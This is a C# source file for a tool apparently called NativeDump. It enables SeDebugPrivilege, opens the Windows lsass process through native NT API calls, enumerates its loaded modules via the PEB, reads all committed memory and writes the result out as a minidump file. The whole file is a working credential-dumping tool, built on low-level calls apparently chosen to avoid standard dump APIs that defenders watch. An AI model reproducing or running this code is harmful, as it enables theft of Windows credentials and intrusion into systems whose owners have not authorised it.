using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using static NativeDump.Win32;
using static NativeDump.CreateFile;

namespace NativeDump
{
    public class ModuleInformation
    {
        public string Name { get; set; }
        public string FullPath { get; set; }
        public IntPtr Address { get; set; }
        public int Size { get; set; }

        public ModuleInformation(string name, string fullpath, IntPtr address, int size)
        {
            Name = name;
            FullPath = fullpath;
            Address = address;
            Size = size;
        }
    }


    [StructLayout(LayoutKind.Sequential)]
    public struct SYSTEM_INFO
    {
        public ushort wProcessorArchitecture;
        public ushort wReserved;
        public uint dwPageSize;
        public IntPtr lpMinimumApplicationAddress;
        public IntPtr lpMaximumApplicationAddress;
        public IntPtr dwActiveProcessorMask;
        public uint dwNumberOfProcessors;
        public uint dwProcessorType;
        public uint dwAllocationGranularity;
        public ushort wProcessorLevel;
        public ushort wProcessorRevision;
    }


    internal class Program
    {
        [DllImport("kernel32.dll")] public static extern void GetSystemInfo(out SYSTEM_INFO lpSystemInfo);


        static void EnableDebugPrivileges()
        {
            IntPtr currentProcess = Process.GetCurrentProcess().Handle;
            IntPtr tokenHandle = IntPtr.Zero;
            try
            {
                uint ntstatus = NtOpenProcessToken(currentProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, ref tokenHandle);
                if (ntstatus != 0)
                {
                    Console.WriteLine("[-] Error calling NtOpenProcessToken. NTSTATUS: 0x" + ntstatus.ToString("X"));
                    Environment.Exit(-1);
                }

                TOKEN_PRIVILEGES tokenPrivileges = new TOKEN_PRIVILEGES
                {
                    PrivilegeCount = 1,
                    Luid = new LUID { LowPart = 20, HighPart = 0 }, // LookupPrivilegeValue(null, "SeDebugPrivilege", ref luid);
                    Attributes = 0x00000002
                };

                ntstatus = NtAdjustPrivilegesToken(tokenHandle, false, ref tokenPrivileges, (uint)Marshal.SizeOf(typeof(TOKEN_PRIVILEGES)), IntPtr.Zero, IntPtr.Zero);
                if (ntstatus != 0)
                {
                    Console.WriteLine("[-] Error calling NtAdjustPrivilegesToken. NTSTATUS: 0x" + ntstatus.ToString("X") + ". Maybe you need to calculate the LowPart of the LUID using LookupPrivilegeValue");
                    Environment.Exit(-1);
                }
            }
            finally
            {
                if (tokenHandle != IntPtr.Zero)
                {
                    NtClose(tokenHandle);
                }
            }
        }
        
        public static IntPtr ReadRemoteIntPtr(IntPtr hProcess, IntPtr mem_address)
        {
            byte[] buff = new byte[8];
            uint ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, buff.Length, out _);
            if (ntstatus != 0)
            {
                Console.WriteLine("[-] Error calling NtReadVirtualMemory. NTSTATUS: 0x" + ntstatus.ToString("X"));
            }
            long value = BitConverter.ToInt64(buff, 0);
            return (IntPtr)value;
        }


        public static string ReadRemoteWStr(IntPtr hProcess, IntPtr mem_address)
        {
            byte[] buff = new byte[256];
            uint ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, buff.Length, out _);
            if (ntstatus != 0)
            {
                Console.WriteLine("[-] Error calling NtReadVirtualMemory. NTSTATUS: 0x" + ntstatus.ToString("X"));
            }
            string unicode_str = "";
            for (int i = 0; i < buff.Length - 1; i += 2)
            {
                if (buff[i] == 0 && buff[i + 1] == 0) { break; }
                unicode_str += BitConverter.ToChar(buff, i);
            }
            return unicode_str;
        }


        public unsafe static List<ModuleInformation> CustomGetModuleHandle(IntPtr hProcess)
        {
            List<ModuleInformation> moduleInformationList = new List<ModuleInformation>();

            uint process_basic_information_size = 48;
            int peb_offset = 0x8;
            int ldr_offset = 0x18;
            int inInitializationOrderModuleList_offset = 0x30;
            int flink_dllbase_offset = 0x20;
            int flink_buffer_fulldllname_offset = 0x40;
            int flink_buffer_offset = 0x50;

            // Create byte array with the size of the PROCESS_BASIC_INFORMATION structure
            byte[] pbi_byte_array = new byte[process_basic_information_size];

            // Create a PROCESS_BASIC_INFORMATION structure in the byte array
            IntPtr pbi_addr = IntPtr.Zero;
            fixed (byte* p = pbi_byte_array)
            {
                pbi_addr = (IntPtr)p;

                uint ntstatus = NtQueryInformationProcess(hProcess, 0x0, pbi_addr, process_basic_information_size, out uint ReturnLength);
                if (ntstatus != 0)
                {
                    Console.WriteLine("[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x" + ntstatus.ToString("X"));
                }
                Console.WriteLine("[+] Process_Basic_Information Address: \t\t0x" + pbi_addr.ToString("X"));
            }

            // Get PEB Base Address
            IntPtr peb_pointer = pbi_addr + peb_offset;
            Console.WriteLine("[+] PEB Address Pointer:\t\t\t0x" + peb_pointer.ToString("X"));
            IntPtr pebaddress = Marshal.ReadIntPtr(peb_pointer);
            Console.WriteLine("[+] PEB Address:\t\t\t\t0x" + pebaddress.ToString("X"));

            // Get Ldr 
            IntPtr ldr_pointer = pebaddress + ldr_offset;
            IntPtr ldr_adress = ReadRemoteIntPtr(hProcess, ldr_pointer);

            IntPtr InInitializationOrderModuleList = ldr_adress + inInitializationOrderModuleList_offset;
            Console.WriteLine("[+] InInitializationOrderModuleList:\t\t0x" + InInitializationOrderModuleList.ToString("X"));
            IntPtr next_flink = ReadRemoteIntPtr(hProcess, InInitializationOrderModuleList);

            IntPtr dll_base = (IntPtr)1337;
            while (dll_base != IntPtr.Zero)
            {
                next_flink = next_flink - 0x10;
                // Get DLL base address
                dll_base = ReadRemoteIntPtr(hProcess, (next_flink + flink_dllbase_offset));
                IntPtr buffer = ReadRemoteIntPtr(hProcess, (next_flink + flink_buffer_offset));
                // DLL base name
                string base_dll_name = ReadRemoteWStr(hProcess, buffer);
                // DLL full path
                string full_dll_path = ReadRemoteWStr(hProcess, ReadRemoteIntPtr(hProcess, (next_flink + flink_buffer_fulldllname_offset)));

                moduleInformationList.Add(new ModuleInformation(base_dll_name.ToLower(), full_dll_path, dll_base, 0));        
                next_flink = ReadRemoteIntPtr(hProcess, (next_flink + 0x10));
            }
            return moduleInformationList;
        }


        static void Main(string[] args)
        {
            // Get process name
            string procname = "lsass";

            //Get process PID
            Process[] process_list = Process.GetProcessesByName(procname);
            if (process_list.Length == 0)
            {
                Console.WriteLine("[-] Process " + procname + " not found.");
                Environment.Exit(0);
            }
            int processPID = process_list[0].Id;
            Console.WriteLine("[+] Process PID: \t\t\t\t" + processPID);

            // Get SeDebugPrivilege
            EnableDebugPrivileges();

            // Get process handle with NtOpenProcess
            IntPtr processHandle = IntPtr.Zero;
            CLIENT_ID client_id = new CLIENT_ID();
            client_id.UniqueProcess = (IntPtr)processPID;
            client_id.UniqueThread = IntPtr.Zero;
            OBJECT_ATTRIBUTES objAttr = new OBJECT_ATTRIBUTES();
            uint ntstatus = NtOpenProcess(ref processHandle, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, ref objAttr, ref client_id);
            if (ntstatus != 0)
            {
                Console.WriteLine("[-] Error calling NtOpenProcess. NTSTATUS: 0x" + ntstatus.ToString("X"));
            }
            Console.WriteLine("[+] Process handle:  \t\t\t\t" + processHandle);

            // Loop the memory regions
            long proc_max_address_l = (long)0x7FFFFFFEFFFF;
            IntPtr mem_address = IntPtr.Zero;
            byte[] memory_regions = { };
            List<Memory64Info> mem64info_List = new List<Memory64Info>();

            // Get modules information
            List<ModuleInformation> moduleInformationList = CustomGetModuleHandle(processHandle);
            int aux_size = 0;
            string aux_name = "";

            // DEBUG
            if (Environment.Is64BitOperatingSystem)
            {
                Console.WriteLine("[+] The system is 64-bit.");
            }
            else
            {
                Console.WriteLine("[+] The system is 32-bit.");
            }
            if (IntPtr.Size == 8)
            {
                Console.WriteLine("[+] The application is running as a 64-bit executable.");
            }
            else if (IntPtr.Size == 4)
            {
                Console.WriteLine("[-] The application is running as a 32-bit executable.");
            }

            // DEBUG - Check maximum address
            SYSTEM_INFO sysInfo;
            GetSystemInfo(out sysInfo);
            Console.WriteLine("[+] Maximum Address: \t\t\t\t0x" + sysInfo.lpMaximumApplicationAddress.ToString("X"));

            // DEBUG
            Console.WriteLine("\n[+] Populating Memory64Info list...");
            int counter = 0;

            while ((long)mem_address < proc_max_address_l)
            {
                // Populate MEMORY_BASIC_INFORMATION struct
                MEMORY_BASIC_INFORMATION mbi = new MEMORY_BASIC_INFORMATION();
                ntstatus = NtQueryVirtualMemory(processHandle, (IntPtr)mem_address, MemoryBasicInformation, out mbi, 0x30, out _);
                if (ntstatus != 0)
                {
                    Console.WriteLine("[-] Error calling NtQueryVirtualMemory. NTSTATUS: 0x" + ntstatus.ToString("X"));
                }

                // If readable and commited --> Write memory region to a file
                if (mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT)
                {
                    // Add to Memory64Info list
                    Memory64Info mem64info = new Memory64Info();
                    mem64info.Address = mbi.BaseAddress;
                    mem64info.Size = mbi.RegionSize;
                    mem64info_List.Add(mem64info);

                    //Console.WriteLine("[*] Mem64Info: \t0x" + mbi.BaseAddress.ToString("X") + "\t0x" + mbi.RegionSize.ToString("X"));
                    counter += 1;
                    Console.WriteLine(String.Format("|{0,4}|{1,15}|{2,15}|{3,15}|", counter, "0x" + mem_address.ToString("X"), "0x" + mbi.BaseAddress.ToString("X"), "0x" + mbi.RegionSize.ToString("X")));
                    
                    // Dump memory
                    byte[] buffer = new byte[(int)mbi.RegionSize];
                    ntstatus = NtReadVirtualMemory(processHandle, mbi.BaseAddress, buffer, (int)mbi.RegionSize, out _);
                    if (ntstatus != 0 && ntstatus != 0x8000000D)
                    {
                        Console.WriteLine("[-] Error calling NtReadVirtualMemory. NTSTATUS: 0x" + ntstatus.ToString("X"));
                    }
                    byte[] new_bytearray = new byte[memory_regions.Length + buffer.Length];
                    Buffer.BlockCopy(memory_regions, 0, new_bytearray, 0, memory_regions.Length);
                    Buffer.BlockCopy(buffer, 0, new_bytearray, memory_regions.Length, buffer.Length);
                    memory_regions = new_bytearray;

                    ModuleInformation aux_module = moduleInformationList.Find(obj => obj.Name == aux_name);

                    if ((int)mbi.RegionSize == 0x1000 && mbi.BaseAddress != aux_module.Address)
                    {
                        aux_module.Size = aux_size;
                        int aux_index = moduleInformationList.FindIndex(obj => obj.Name == aux_name);
                        moduleInformationList[aux_index] = aux_module;

                        foreach (ModuleInformation modInfo in moduleInformationList)
                        {
                            if (mbi.BaseAddress == modInfo.Address)
                            {
                                aux_name = modInfo.Name.ToLower();
                                aux_size = (int)mbi.RegionSize;
                            }
                        }
                    }
                    else
                    {
                        aux_size += (int)mbi.RegionSize;
                    }
                }
                else
                {
                    Console.WriteLine(String.Format("|{0,4}|{1,15}|{2,15}|{3,15}|", "-", "0x" + mem_address.ToString("X"), "-", "-"));
                }
                // Next memory region
                mem_address = (IntPtr)((ulong)mem_address + (ulong)mbi.RegionSize);
            }
            Console.WriteLine("");

            // Get file name
            string dumpfile = "proc_" + processPID + ".dmp";
            if (args.Length > 0)
            {
                dumpfile = args[0];
            }

            // Generate Minidump file
            CreateMinidump(moduleInformationList, mem64info_List, memory_regions, dumpfile);

            // Close process handle
            ntstatus = NtClose(processHandle);
            if (ntstatus != 0)
            {
                Console.WriteLine("[-] Error calling NtClose. NTSTATUS: 0x" + ntstatus.ToString("X"));
            }
        }
    }
}